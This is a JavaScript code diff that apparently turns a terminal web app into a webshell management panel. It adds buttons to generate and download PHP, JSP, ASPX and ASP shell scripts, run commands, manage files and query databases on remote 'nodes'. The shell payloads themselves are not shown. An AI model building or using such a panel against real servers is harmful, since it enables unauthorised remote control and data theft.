+    const type = document.getElementById('scriptType').value;
+    const fname = { php: 'shell.php', jsp: 'shell.jsp', aspx: 'shell.aspx', asp: 'shell.asp' }[type];
+    const blob = new Blob([el.value], { type: 'text/plain' });
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = fname;
+    a.click();
+    URL.revokeObjectURL(a.href);
 }
 
 // ===== 事件绑定 =====
 function bindEvents() {
-    // 新建终端
-    document.getElementById('newTerminalBtn').onclick = createTerminal;
+    document.getElementById('addNodeBtn').onclick = () => showNodeModal(null);
+    document.getElementById('saveNodeBtn').onclick = saveNode;
+    document.getElementById('editNodeBtn').onclick = () => {
+        if (!state.currentNode) { toast('请先选择节点', 'error'); return; }
+        showNodeModal(state.currentNode);
+    };
+    document.getElementById('deleteNodeBtn').onclick = deleteNode;
+    document.getElementById('testNodeBtn').onclick = testNode;
 
-    // 侧边栏切换
+    document.getElementById('genScriptBtn').onclick = () => { openModal('scriptModal'); genScript(); };
+    document.getElementById('scriptGenBtn').onclick = genScript;
+    document.getElementById('scriptCopyBtn').onclick = copyScript;
+    document.getElementById('scriptDownloadBtn').onclick = downloadScript;
+
+    document.getElementById('logoutBtn').onclick = () => {
+        if (confirm('确定退出登录？')) logout(false);
+    };
+
     document.getElementById('sidebarToggle').onclick = () => {
         document.getElementById('sidebar').classList.toggle('collapsed');
-        setTimeout(() => {
-            const active = state.terminals.find((t) => t.active);
-            if (active) active.fitAddon.fit();
-        }, 250);
     };
 
-    // 退出登录
-    document.getElementById('logoutBtn').onclick = () => {
-        if (confirm('确定退出登录？')) {
-            localStorage.removeItem('mayfly_token');
-            localStorage.removeItem('mayfly_user');
-            window.location.href = '/login';
-        }
-    };
-
-    // 清屏
-    document.getElementById('clearBtn').onclick = () => {
-        const active = state.terminals.find((t) => t.active);
-        if (active) {
-            active.term.clear();
-        }
-    };
-
-    // 全屏
-    document.getElementById('fullscreenBtn').onclick = () => {
-        const main = document.querySelector('.main-content');
-        main.classList.toggle('fullscreen');
-        const icon = document.querySelector('#fullscreenBtn i');
-        if (main.classList.contains('fullscreen')) {
-            icon.className = 'fas fa-compress';
-        } else {
-            icon.className = 'fas fa-expand';
-        }
-        setTimeout(() => {
-            const active = state.terminals.find((t) => t.active);
-            if (active) active.fitAddon.fit();
-        }, 100);
-    };
-
-    // 设置弹窗
-    document.getElementById('settingsBtn').onclick = () => {
-        document.getElementById('settingsModal').style.display = 'flex';
-        document.getElementById('fontSizeSlider').value = state.settings.fontSize;
-        document.getElementById('fontSizeValue').textContent = state.settings.fontSize + 'px';
-        document.getElementById('themeSelect').value = state.settings.theme;
-        document.getElementById('cursorBlink').checked = state.settings.cursorBlink;
-    };
-
-    // 字体大小滑块
-    document.getElementById('fontSizeSlider').oninput = (e) => {
-        document.getElementById('fontSizeValue').textContent = e.target.value + 'px';
-    };
-
-    // 保存设置
-    document.getElementById('saveSettingsBtn').onclick = () => {
-        state.settings.fontSize = parseInt(document.getElementById('fontSizeSlider').value);
-        state.settings.theme = document.getElementById('themeSelect').value;
-        state.settings.cursorBlink = document.getElementById('cursorBlink').checked;
-        saveSettings();
-        applySettings();
-        document.getElementById('settingsModal').style.display = 'none';
-    };
-
-    // 窗口大小变化时重新 fit
-    window.addEventListener('resize', () => {
-        const active = state.terminals.find((t) => t.active);
-        if (active) active.fitAddon.fit();
+    document.querySelectorAll('.tab').forEach((t) => {
+        t.onclick = () => switchTab(t.dataset.tab);
     });
 
-    // 键盘快捷键
-    document.addEventListener('keydown', (e) => {
-        // Ctrl+Shift+T: 新建终端
-        if (e.ctrlKey && e.shiftKey && e.key === 'T') {
-            e.preventDefault();
-            createTerminal();
-        }
+    // 命令执行
+    document.getElementById('cmdRunBtn').onclick = runCmd;
+    document.getElementById('cmdInput').onkeydown = (e) => { if (e.key === 'Enter') runCmd(); };
+    document.getElementById('cmdClearBtn').onclick = () => { document.getElementById('cmdOutput').textContent = ''; };
+
+    // 文件管理
+    document.getElementById('fileUpBtn').onclick = () => loadFiles(dirOf(state.filePath));
+    document.getElementById('fileGoBtn').onclick = () => loadFiles(document.getElementById('filePath').value.trim());
+    document.getElementById('filePath').onkeydown = (e) => { if (e.key === 'Enter') loadFiles(e.target.value.trim()); };
+    document.getElementById('fileRefreshBtn').onclick = () => loadFiles(state.filePath);
+    document.getElementById('fileMkdirBtn').onclick = mkdirFile;
+    document.getElementById('fileUploadBtn').onclick = () => document.getElementById('fileUploadInput').click();
+    document.getElementById('fileUploadInput').onchange = uploadFiles;
+    document.getElementById('fileEditorSave').onclick = saveFile;
+    document.getElementById('fileEditorClose').onclick = () => {
+        document.getElementById('fileEditor').style.display = 'none';
+        state.editingFile = null;
+        loadFiles(state.filePath);
+    };
+    document.getElementById('fileEditorDownload').onclick = () => {
+        if (!state.editingFile) return;
+        const blob = new Blob([base64ToBytes(state.editingFile.base64)]);
+        const a = document.createElement('a');
+        a.href = URL.createObjectURL(blob);
+        a.download = state.editingFile.path.split(/[\\/]/).pop();
+        a.click();
+        URL.revokeObjectURL(a.href);
+    };
+
+    // 数据库
+    document.getElementById('dbRunBtn').onclick = runDb;
+    document.getElementById('dbSql').onkeydown = (e) => {
+        if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') runDb();
+    };
+
+    // 终端自适应
+    window.addEventListener('resize', () => {
+        const t = state.terms[state.activeTermId];
+        if (t) t.fitAddon.fit();
     });
 }
 
-// ===== 启动 =====
+// ===== 初始化 =====
+async function init() {
+    if (!state.token) { window.location.href = '/login'; return; }
+    document.getElementById('currentUser').textContent = state.user;
+    bindEvents();
+    try {
+        await loadNodes();
+    } catch (e) { /* 401 会在 api() 中处理跳转 */ }
+}
+
 document.addEventListener('DOMContentLoaded', init);
